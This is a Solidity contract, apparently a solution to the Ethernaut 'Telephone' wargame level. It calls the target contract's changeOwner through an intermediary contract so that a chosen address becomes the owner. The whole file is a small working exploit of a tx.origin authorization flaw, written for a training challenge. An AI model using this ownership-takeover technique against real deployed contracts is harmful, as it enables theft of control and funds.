// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../ethernaut/Telephone.sol";

contract HackTelephone {
    address public owner;
    Telephone private _telephoneContract;
    address public _desiredOwner;

    constructor(address telephoneContract, address desiredOwner) {
        _telephoneContract = Telephone(telephoneContract);
        _desiredOwner = desiredOwner;
    }

    function attack() public {
        _telephoneContract.changeOwner(_desiredOwner);
    }
}
